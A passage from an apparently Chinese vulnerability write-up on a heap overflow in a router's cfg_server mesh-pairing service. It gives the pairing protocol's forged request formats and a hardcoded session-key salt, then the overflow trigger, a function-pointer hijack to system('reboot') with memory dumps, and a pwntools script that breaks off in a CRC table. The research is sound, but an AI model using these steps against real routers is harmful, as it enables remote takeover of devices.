   <span class="built_in">memset</span>(v12, <span class="number">0</span>, v11);</span><br><span class="line">        v13 = v10;</span><br><span class="line">        <span class="keyword">for</span> ( i = data_len; ; i -= <span class="number">16</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v15 = data + data_len - i;</span><br><span class="line">            <span class="keyword">if</span> ( i &lt;= <span class="number">0x10</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> ( !EVP_DecryptUpdate(CTX, v13, v17, v15, <span class="number">16</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s(%d):Failed to EVP_DecryptUpdate()!!\n&quot;</span>, <span class="string">&quot;aes_decrypt&quot;</span>, <span class="number">795</span>);</span><br><span class="line">                EVP_CIPHER_CTX_free(CTX);</span><br><span class="line">                <span class="built_in">free</span>(v10);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v13 += v17[<span class="number">0</span>];</span><br><span class="line">            *a4 += v17[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此函数使用 openssl 库中的 aes256 部分，前几行初始化 EVP_CIPHER_CTX 结构体，第 13 行将 data_len 和 EVP_CIPHER_CTX_block_size(CTX) 值相加，调试可知这里的 EVP_CIPHER_CTX_block_size(CTX) &#x3D; 0x10。</p>
<p>第 14 行通过相加得到的值分配内存空间，第 25 行调用 EVP_DecryptUpdate 函数开始对数据进行循环解密，循环次数等于 data_len。</p>
<p>问题在于，整个解密流程中，程序没有对 data_len(unsigned int) 变量进行校验，当我们传递一个较大的值，例如 0xffffffff，第 13 行相加操作产生整数溢出，v11 是 unsigned int 类型，整数溢出后它会变成一个较小的值，导致 malloc 分配很小的内存空间。而后续解密数据时循环次数使用了 data_len，将拷贝过多数据到堆内存空间，造成堆溢出。</p>
<h2 id="Mesh-配对流程分析"><a href="#Mesh-配对流程分析" class="headerlink" title="Mesh 配对流程分析"></a>Mesh 配对流程分析</h2><p>能够触发堆溢出的途径很多，我们选择其中较为完整的分析，尝试理解 cfg_server 配对流程。</p>
<p><strong>1. 请求公钥</strong></p>
<p>客户端收到配对消息，构造 opcode &#x3D; 1 的请求，cfg_server 调用 cm_processREQ_KU 函数，此函数直接返回保存在内存中的一个 rsa_publickey。</p>
<p>伪造客户端请求数据：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0        8        16      24       32  (bit)</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|             opcode = 1            |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|            data_len = 1           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|            data_crc = 0           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|               data                |</span><br><span class="line">|              (\x00)               |</span><br><span class="line">+--------+--------+--------+--------+</span><br></pre></td></tr></table></figure></div>

<p><strong>2. 交换密钥</strong></p>
<p>客户端收到 public key，构造 opcode &#x3D; 3 的请求，cfg_server 调用 cm_processREQ_NC 函数，此函数实现了简单的密钥交换功能。</p>
<p>伪造客户端请求数据:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0        8        16      24       32  (bit)</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|             opcode = 3            |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|              data_len             |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|             data_crc              |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|               data                |------------------</span><br><span class="line">|                ...                |                 |</span><br><span class="line">+--------+--------+--------+--------+                 |</span><br><span class="line">                                                      |</span><br><span class="line">data:                                                 |</span><br><span class="line">0        8        16      24       32  (bit)          |</span><br><span class="line">+--------+--------+--------+--------+                 |</span><br><span class="line">|           banner1 = 0x1           | &lt;---------------|</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|          part1_data_len           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|          part1_data_crc           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|           part1_data              |</span><br><span class="line">|                ...                |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|           banner2 = 0x3           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|          part2_data_len           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|          part2_data_crc           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|           part2_data              |</span><br><span class="line">|                ...                |</span><br><span class="line">+--------+--------+--------+--------+</span><br></pre></td></tr></table></figure></div>

<p>part1_data 为客户端指定的一个 AES256 密钥，part2_data 为客户端 nonce 值。</p>
<p>客户端将以上数据利用之前请求得到的公钥进行加密，然后发送到服务端，服务端收到请求后进行多个校验，如果全部通过，服务端会构造响应报文</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0        8        16      24       32  (bit)</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|              rescode              |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|            res_data_len           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|            res_data_crc           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|             res_data              |</span><br><span class="line">|            (encrypted)            |</span><br><span class="line">|                ...                |</span><br><span class="line">+--------+--------+--------+--------+</span><br></pre></td></tr></table></figure></div>

<p>返回的数据中 data 部分利用客户端提供的 AES 密钥进行了加密，客户端自行解密后得到数据</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0        8        16      24       32  (bit)</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|             server_nonce          |</span><br><span class="line">|              len = 0x20           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|            client_nonce           |</span><br><span class="line">|                 ...               |</span><br><span class="line">+--------+--------+--------+--------+</span><br></pre></td></tr></table></figure></div>

<p>关键内容是 server_nonce。</p>
<p><strong>3. 握手</strong></p>
<p>客户端收到服务端返回的 server_nonce 后，通过以下算法得到此次会话的 session_key</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sha256(&quot;A22AAC3EB69F9943ED8929D810A077A3&quot; + server_nonce + client_nonce)</span><br></pre></td></tr></table></figure></div>

<p>之后客户端构造 opcode &#x3D; 5 的请求，cfg_server 调用 cm_processREP_OK 函数，服务端按照相同的逻辑计算出 session_key。</p>
<p>伪造客户端请求数据:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0        8        16      24       32  (bit)</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|             opcode = 5            |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|            data_len = 0           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|            data_crc = 0           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|               data                |</span><br><span class="line">|              (\x00)               |</span><br><span class="line">+--------+--------+--------+--------+</span><br></pre></td></tr></table></figure></div>

<p>如果服务端返回 0x6 开头的响应，说明握手成功，服务端把会话的 session_key 放到一个全局变量：clientHashTable 中，后续只要客户端不切断连接，就可以用这个 session_key 调用更多功能。</p>
<p><strong>4. 触发漏洞</strong></p>
<p>客户端构造 opcode &#x3D; 0xf 的请求，cfg_server 调用 cm_processREQ_JOIN 函数，此函数尝试将具有合法会话的客户端加入 mesh 列表。</p>
<p>部分代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line">session_key = cm_selectSessionKey(v13, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">v31 = cm_aesDecryptMsg(session_key, v21, tlv, v20);</span><br></pre></td></tr></table></figure></div>

<p>这里就回到前面的漏洞分析部分，AES 解密时 len 使用不当，所以我们可以构造如下请求触发漏洞</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0        8        16      24       32  (bit)</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|             opcode = 0xf          |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|       data_len = 0xffffffff       |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|             data_crc = 0          |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|               payload             |</span><br><span class="line">|           (&#x27;a&#x27; * 0x200)           |</span><br><span class="line">+--------+--------+--------+--------+</span><br></pre></td></tr></table></figure></div>

<p>由于 data_len 异常，所以 crc 校验只需传入 data_crc &#x3D; 0 即可绕过。此外，payload 部分应使用 session_key 进行 AES 加密。</p>
<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>此漏洞是堆溢出，按照正常思路应该收集程序中可能的 malloc 和 free 流程，然后通过如 fastbin_attack 等手段完成利用，但经过调试分析发现，当堆块布局满足一定条件时，openssl 初始化的 EVP_CIPHER_CTX 结构体将位于堆溢出内存下方，这就意味着可修改此结构体中的一些成员变量。</p>
<p>这里提供一种思路，查看 openssl <a class="link"   href="https://code.woboq.org/qt5/qtwebengine/src/3rdparty/chromium/third_party/boringssl/src/include/openssl/cipher.h.html#evp_cipher_ctx_st" >源代码<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>可以看到 EVP_CIPHER_CTX 的具体定义</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evp_cipher_ctx_st</span> &#123;</span></span><br><span class="line">    <span class="comment">// cipher contains the underlying cipher for this context.</span></span><br><span class="line">    <span class="type">const</span> EVP_CIPHER *cipher;</span><br><span class="line">    <span class="comment">// app_data is a pointer to opaque, user data.</span></span><br><span class="line">    <span class="type">void</span> *app_data;      <span class="comment">// application stuff</span></span><br><span class="line">    <span class="comment">// cipher_data points to the |cipher| specific state.</span></span><br><span class="line">    <span class="type">void</span> *cipher_data;</span><br><span class="line">    <span class="comment">// key_len contains the length of the key, which may differ from</span></span><br><span class="line">    <span class="comment">// |cipher-&gt;key_len| if the cipher can take a variable key length.</span></span><br><span class="line">    <span class="type">unsigned</span> key_len;</span><br><span class="line">    <span class="comment">// encrypt is one if encrypting and zero if decrypting.</span></span><br><span class="line">    <span class="type">int</span> encrypt;</span><br><span class="line">    <span class="comment">// flags contains the OR of zero or more |EVP_CIPH_*| flags, above.</span></span><br><span class="line">    <span class="type">uint32_t</span> flags;</span><br><span class="line">    <span class="comment">// oiv contains the original IV value.</span></span><br><span class="line">    <span class="type">uint8_t</span> oiv[EVP_MAX_IV_LENGTH];</span><br><span class="line">    <span class="comment">// iv contains the current IV value, which may have been updated.</span></span><br><span class="line">    <span class="type">uint8_t</span> iv[EVP_MAX_IV_LENGTH];</span><br><span class="line">    <span class="comment">// buf contains a partial block which is used by, for example, CTR mode to</span></span><br><span class="line">    <span class="comment">// store unused keystream bytes.</span></span><br><span class="line">    <span class="type">uint8_t</span> buf[EVP_MAX_BLOCK_LENGTH];</span><br><span class="line">    <span class="comment">// buf_len contains the number of bytes of a partial block contained in</span></span><br><span class="line">    <span class="comment">// |buf|.</span></span><br><span class="line">    <span class="type">int</span> buf_len;</span><br><span class="line">    <span class="comment">// num contains the number of bytes of |iv| which are valid for modes that</span></span><br><span class="line">    <span class="comment">// manage partial blocks themselves.</span></span><br><span class="line">    <span class="type">unsigned</span> num;</span><br><span class="line">    <span class="comment">// final_used is non-zero if the |final| buffer contains plaintext.</span></span><br><span class="line">    <span class="type">int</span> final_used;</span><br><span class="line">    <span class="comment">// block_mask contains |cipher-&gt;block_size| minus one. (The block size</span></span><br><span class="line">    <span class="comment">// assumed to be a power of two.)</span></span><br><span class="line">    <span class="type">int</span> block_mask;</span><br><span class="line">    <span class="type">uint8_t</span> final[EVP_MAX_BLOCK_LENGTH];  <span class="comment">// possible final block</span></span><br><span class="line">&#125; <span class="comment">/* EVP_CIPHER_CTX */</span>;</span><br></pre></td></tr></table></figure></div>

<p>第一个成员也是结构体，定义如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evp_cipher_st</span> &#123;</span></span><br><span class="line">    <span class="comment">// type contains a NID identifing the cipher. (e.g. NID_aes_128_gcm.)</span></span><br><span class="line">    <span class="type">int</span> nid;</span><br><span class="line">    <span class="comment">// block_size contains the block size, in bytes, of the cipher, or 1 for a</span></span><br><span class="line">    <span class="comment">// stream cipher.</span></span><br><span class="line">    <span class="type">unsigned</span> block_size;</span><br><span class="line">    <span class="comment">// key_len contains the key size, in bytes, for the cipher. If the cipher</span></span><br><span class="line">    <span class="comment">// takes a variable key size then this contains the default size.</span></span><br><span class="line">    <span class="type">unsigned</span> key_len;</span><br><span class="line">    <span class="comment">// iv_len contains the IV size, in bytes, or zero if inapplicable.</span></span><br><span class="line">    <span class="type">unsigned</span> iv_len;</span><br><span class="line">    <span class="comment">// ctx_size contains the size, in bytes, of the per-key context for this</span></span><br><span class="line">    <span class="comment">// cipher.</span></span><br><span class="line">    <span class="type">unsigned</span> ctx_size;</span><br><span class="line">    <span class="comment">// flags contains the OR of a number of flags. See |EVP_CIPH_*|.</span></span><br><span class="line">    <span class="type">uint32_t</span> flags;</span><br><span class="line">    <span class="comment">// app_data is a pointer to opaque, user data.</span></span><br><span class="line">    <span class="type">void</span> *app_data;</span><br><span class="line">    <span class="type">int</span> (*init)(EVP_CIPHER_CTX *ctx, <span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">const</span> <span class="type">uint8_t</span> *iv,</span><br><span class="line">                <span class="type">int</span> enc);</span><br><span class="line">    <span class="type">int</span> (*cipher)(EVP_CIPHER_CTX *ctx, <span class="type">uint8_t</span> *out, <span class="type">const</span> <span class="type">uint8_t</span> *in,</span><br><span class="line">                  <span class="type">size_t</span> inl);</span><br><span class="line">    <span class="comment">// cleanup, if non-NULL, releases memory associated with the context. It is</span></span><br><span class="line">    <span class="comment">// called if |EVP_CTRL_INIT| succeeds. Note that |init| may not have been</span></span><br><span class="line">    <span class="comment">// called at this point.</span></span><br><span class="line">    <span class="type">void</span> (*cleanup)(EVP_CIPHER_CTX *);</span><br><span class="line">    <span class="type">int</span> (*ctrl)(EVP_CIPHER_CTX *, <span class="type">int</span> type, <span class="type">int</span> arg, <span class="type">void</span> *ptr);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>我们发现此结构体后面几个变量都是函数指针，其中第 8 个成员会在 EVP_CIPHER_CTX_reset 函数中被使用</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">EVP_CIPHER_CTX_reset</span><span class="params">(_DWORD *evp_cipher_st)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> (*v2)(<span class="type">void</span>); <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !evp_cipher_st )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !*evp_cipher_st )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">    CRYPTO_free();</span><br><span class="line">    ENGINE_finish(evp_cipher_st[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">memset</span>(evp_cipher_st, <span class="number">0</span>, <span class="number">0x8C</span>u);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = *(<span class="type">int</span> (**)(<span class="type">void</span>))(*evp_cipher_st + <span class="number">0x1C</span>);    <span class="comment">// call struct pointer here</span></span><br><span class="line">  <span class="keyword">if</span> ( !v2 || (result = v2()) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( evp_cipher_st[<span class="number">24</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(*evp_cipher_st + <span class="number">32</span>) )</span><br><span class="line">        OPENSSL_cleanse();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果我们通过堆溢出能够将 EVP_CIPHER_CTX 中第一个成员指针劫持到一可控内存，就能劫持程序的控制流。</p>
<p><strong>样例利用过程</strong></p>
<p>首先完成上述握手流程，在握手流程期间程序会多次调用 malloc、free 等函数，heap 有较大变化，一定情况下将形成以下布局</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|        user_control_chunk         |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|        EVP_CIPHER_CTX             |</span><br><span class="line">+--------+--------+--------+--------+</span><br></pre></td></tr></table></figure></div>

<p>EVP_CIPHER_CTX 结构体相距用户可控输入距离为 0x30 字节。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/tfc2021-ax56u-1.png"
                     
                ></p>
<p>初始内存布局：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xb64009f8:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xb6400a08:	0x00000000	0x0000001d	0xb6400938	0x00000000</span><br><span class="line">0xb6400a18:	0x00000000	0x00000000	0x00000000	0x00000095</span><br><span class="line">0xb6400a28:	0xb6e67b1c	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure></div>

<p>我们构造数据，刚好覆盖掉 EVP_CIPHER_CTX 第一个成员变量，使 0xb6400a28 &#x3D; 0xb64009f8，0xb6400a14 &#x3D; system@plt，0xb6400a2c &#x3D; `reboot`</p>
<p>构造后内存布局：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xb64009f8:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xb6400a08:	0x00000000	0x00000000	0x00000000	0x000143d4</span><br><span class="line">0xb6400a18:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0xb6400a28:	0xb64009f8	0x62657260	0x60746f6f	0x61616161</span><br></pre></td></tr></table></figure></div>

<p>在 libcrypto.so.1.1 中的 EVP_CIPHER_CTX_reset 函数下断点，当执行到调用函数指针时程序状态：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/tfc2021-ax56u-2.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/tfc2021-ax56u-3.png"
                     
                ></p>
<p>此时就能执行我们设置的命令。</p>
<p><strong>样例调试程序</strong></p>
<p>调试脚本(非 EXP)如下，感兴趣的话可以自行调试分析。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA <span class="keyword">as</span> rsa</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">crc32_table =[</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x77073096</span>, <span class="number">0xEE0E612C</span>, <span class="number">0x990951BA</span>,</span><br><span class="line"><span class="number">0x076DC419</span>, <span class="number">0x706AF48F</span>, <span class="number">0xE963A535</span>, <span class="number">0x9E6495A3</span>,</span><br><span class="line"><span class="number">0x0EDB8832</span>, <span class="number">0x79DCB8A4</span>, <span class="number">0xE0D5E91E</span>, <span class="number">0x97D2D988</span>,</span><br><span class="line"><span class="number">0x09B64C2B</span>, <span class="number">0x7EB17CBD</span>, <span class="number">0xE7B82D07</span>, <span class="number">0x90BF1D91</span>,</span><br><span class="line"><span class="number">0x1DB71064</span>, <span class="number">0x6AB020F2</span>, <span class="number">0xF3B97148</span>, <span class="number">0x84BE41DE</span>,</span><br><span class="line"><span class="number">0x1ADAD47D</span>, <span class="number">0x6DDDE4EB</span>, <span class="number">0xF4D4B551</span>, <span class="number">0x83D385C7</span>,</span><br><span class="line"><span class="number">0x136C9856</span>, <span class="number">0x646BA8C0</span>, <span class="number">0xFD62F97A</span>, <span class="number">0x8A65C9EC</span>,</span><br><span class="line"><span class="number">0x14015C4F</span>, <span class="number">0x63066CD9</span>, <span class="number">0xFA0F3D63</span>, <span class="number">0x8D080DF5</span>,</span><br><span class="line"><span class="number">0x3B6E20C8</span>, <span class="number">0x4C69105E</span>, <span class="number">0xD56041E4</span>, <span class="number">0xA2677172</span>,</span><br><span class="line"><span class="number">0x3C03E4D1</span>, <span class="number">0x4B04D447</span>, <span class="number">0xD20D85FD</span>, <span class="number">0xA50AB56B</span>,</span><br><span class="line"><span class="number">0x35B5A8FA</span>, <span class="number">0x42B2986C</span>, <span class="number">0xDBBBC9D6</span>, <span class="number">0xACBCF940</span>,</span><br><span class="line"><span class="number">0x32D86CE3</span>, <span class="number">0x45DF5C75</span>, <span class="number">0xDCD60DCF</span>, <span class="number">0xABD13D59</span>,</span><br><span class="line"><span class="number">0x26D930AC</span>, <span class="number">0x51DE003A</span>, <span class="number">0xC8D75180</span>, <span class="number">0xBFD06116</span>,</span><br><span class="line"><span class="number">0x21B4F4B5</span>, <span class="number">0x56B3C423</span>, <span class="number">0xCFBA9599</span>, <span class="number">0xB8BDA50F</span>,</span><br><span class="line"><span class="number">0x2802B89E</span>, <span class="number">0x5F058808</span>, <span class="number">0xC60CD9B2</span>, <span class="number">0xB10BE924</span>,</span><br><span class="line"><span class="number">0x2F6F7C87</span>, <span class="number">0x58684C11</span>, <span class="number">0xC1611DAB</span>, <span class="number">0xB6662D3D</span>,</span><br><span class="line"><span class="number">0x76DC4190</span>, <span class="number">0x01DB7106</span>, <span class="number">0x98D220BC</span>, <span class="number">0xEFD5102A</span>,</span><br><span class="line"><span class="number">0x71B18589</span>, <span class="number">0x06B6B51F</span>, <span class="number">0x9FBFE4A5</span>, <span class="number">0xE8B8D433</span>,</span><br><span class="line"><span class="number">0x7807C9A2</span>, <span class="number">0x0F00F934</span>, <span class="number">0x9609A88E</span>, <span class="number">0xE10E9818</span>,</span><br><span class="line"><span class="number">0x7F6A0DBB</span>, <span class="number">0x086D3D2D</span>, <span class="number">0x91646C97</span>, <span class="number">0xE6635C01</span>,</span><br><span class="line"><span class="number">0x6B6B51F4</span>, <span class="number">0x1C6C6162</span>, <span class="number">0x856530D8</span>, <span class="number">0xF262004E</span>,</span><br><span class="line"><span class="number">0x6C0695ED</span>, <span class="number">0x1B01A57B</span>, <span class="number">0x8208F4C1</span>, <span class="number">0xF50FC457</span>,</span><br><span class="line"><span class="number">0x65B0D9C6</span>, <span class="number">0x12B7E950</span>, <span class="number">0x8BBEB8EA</span>, <span class="number">0xFCB9887C</span>,</span><br><span class="line"><span class="number">0x62DD1DDF</span>, <span class="number">0x15DA2D49</span>, <span class="number">0x8CD37CF3</span>, <span class="number">0xFBD44C65</span>,</span><br><span class="line"><span class="number">0x4DB26158</span>, <span class="number">0x3AB551CE</span>, <span class="number">0xA3BC0074</span>, <span class="number">0xD4BB30E2</span>,</span><br><span class="line"><span class="number">0x4ADFA541</span>, <span class="number">0x3DD895D7</span>, <span class="number">0xA4D1C46D</span>, <span class="number">0xD3D6F4FB</span>,</span><br><span class="line"><span class="number">0x4369E96A</span>, <span class="number">0x346ED9FC</span>, <span class="number">0xAD678846</span>, <span class="number">0xDA60B8D0</span>,</span><br><span class="line"><span class="number">0x44042D73</span>, <span class="number">0x33031DE5</span>, <span class="number">0xAA0A4C5F</span>, <span class="number">0xDD0D7CC9</span>,</span><br><span class="line"><span class="number">0x5005713C</span>, <span class="number">0x270241AA</span>, <span class="number">0xBE0B1010</span>, <span class="number">0xC90C2086</span>,</span><br><span class="line"><span class="number">0x5768B525</span>, <span class="number">0x206F85B3</span>, <span class="number">0xB966D409</span>, <span class="number">0xCE61E49F</span>,</span><br><span class="line"><span class="number">0x5EDEF90E</span>, <span class="number">0x29D9C998</span>, <span class="number">0xB0D09822</span>, <span class="number">0xC7D7A8B4</span>,</span><br><span class="line"><span class="number">0x59B33D17</span>, <span class="number">0x2EB40D81</span>, <span class="number">0xB7BD5C3B</span>, <span class="number">0xC0BA6CAD</span>,</span><br><span class="line"><span class="number">0xEDB88320</span>, <span class="number">0x9ABFB3B6</span>, <span class="number">0x03B6E20C</span>, <span class="number">0x74B1D29A</span>,</span><br><span class="line"><span class="number">0xEAD54739</span>, <span class="number">0x9DD277AF</span>, <span class="number">0x04DB2615</span>, <span class="number">0x73DC1683</span>,</span><br><span class="line"><span class="number">0xE3630B12</span>, <span class="number">0x94643B84</span>, <span class="number">0x0D6D6A3E</span>, <span class="number">0x7A6A5AA8</span>,</span><br><span class="line"><span class="number">0xE40ECF0B</span>, <span class="number">0x9309FF9D</span>, <span class="number">0x0A00AE27</span>, <span class="number">0x7D079EB1</span>,</span><br><span class="line"><span class="number">0xF00F9344</span>, <span class="number">0x8708A3D2</span>, <span class="number">0x1E01F268</span>, <span class="number">0x6906C2FE</span>,</span><br><span class="line"><span class="number">0xF762575D</span>, <span class="number">0x806567CB</span>, <span class="number">0x196C3671</span>, <span class="number">0x6E6B06E7</span>,</span><br><span class="line"><span class="number">0xFED41B76</span>, <span class="number">0x89D32BE0</span>, <span class="number">0x10DA7A5A</span>, <span class="number">0x67DD4ACC</span>,</span><br><span class="line"><span class="number">0xF9B9DF6F</span>, <span class="number">0x8EBEEFF9</span>, <span class="number">0x17B7BE43</span>, <span class="number">0x60B08ED5</span>,</span><br><span class="line"><span class="number">0xD6D6A3E8</span>, <span class="number">0xA1D1937E</span>, <span class="number">0x38D8C2C4</span>, <span class="number">0x4FDFF252</span>,</span><br><span class="line"><span class="number">0xD1BB67F1</span>, <span class="number">0xA6BC5767</span>, <span class="number">0x3FB506DD</span>, <span class="number">0x48B2364B</span>,</span><br><span class="line"><span class="number">0xD80D2BDA</span>, <span class="number">0xAF0A1B4C</span>, <span class="number">0x36034AF6</span>, <span class="number">0x41047A60</span>,</span><br><span class="line"><span class="number">0xDF60EFC3</span>, <span class="number">0xA867DF55</span>, <span class="number">0x316E8EEF</span>, <span class="number">0x4669BE79</span>,</span><br><span class="line"><span class="number">0xCB61B38C</span>, <span class="number">0xBC66831A</span>, <span class="number">0x256FD2A0</span>, <span class="number">0x5268E236</span>,</span><br><span class="line"><span class="number">0xCC0C7795</span>, <span class="number">0xBB0B4703</span>, <span class="number">0x220216B9</span>, <span class="number">0x5505262F</span>,</span><br><span class="line"><span class="number">0xC5BA3BBE</span>, <span class="number">0xB2BD0B28</span>, <span class="number">0x2BB45A92</span>, <span class="number">0x5CB36A04</span>,</span><br><span class="line"><span class="number">0xC2D7FFA7</span>, <span class="number">0xB5D0CF31</span>, <span class="number">0x2CD99E8B</span>, <span class="number">0x5BDEAE1D</span>,</span><br><span class="line"><span class="number">0x9B64C2B0</span>, <span class="number">0xEC63F226</span>, <span class="number">0x756AA39C</span>, <span class="number">0x026D930A</span>,</span><br><span class="line"><span class="number">0x9C0906A9</span>, <span class="number">0xEB0E363F</span>, <span class="number">0x72076785</span>, <span class="number">0x05005713</span>,</span><br><span class="line"><span class="number">0x95BF4A82</span>, <span class="number">0xE2B87A14</span>, <span class="number">0x7BB12BAE</span>, <span class="number">0x0CB61B38</span>,</span><br><span class="line"><span class="number">0x92D28E9B</span>, <span class="number">0xE5D5BE0D</span>, <span class="number">0x7CDCEFB7</span>, <span class="number">0x0BDBDF21</span>,</span><br><span class="line"><span class="number">0x86D3D2D4</span>, <span class="number">0xF1D4E242</span>, <span class="number">0x68DDB3F8</span>, <span class="number">0x1FDA836E</span>,</span><br><span class="line"><span class="number">0x81BE16CD</span>, <span class="number">0xF6B9265B</span>, <span class="number">0x6FB077E1</span>, <span class="number">0x18B74777</span>,</span><br><span class="line"><span class="number">0x88085AE6</span>, <span class="number">0xFF0F6A70</span>, <span class="number">0x66063BCA</span>, <span class="number">0x11010B5C</span>,</span><br><span class="line"><span class="number">0x8F659EFF</span>, <span class="number">0xF862AE69</span>, <span class="number">0x616BFFD3</span>, <span class="number">0x166CCF45</span>,</span><br><span class="line"><span class="number">0xA00AE278</span>, <span class="number">0xD70DD2EE</span>, <span class="number">0x4E048354</span>, <span class="number">0x3903B3C2</span>,</span><br><span class="line"><span class="number">0xA7672661</span>, <span class="number">0xD06016F7</span>, <span class="number">0x4969474D</span>, <span class="number">0x3E6E77DB</span>,</span><br><span class="line"><span class="number">0xAED16A4A</span>, <span class="number">0xD9D65ADC</span>, <span class="number">0x40DF0B66</span>, <span 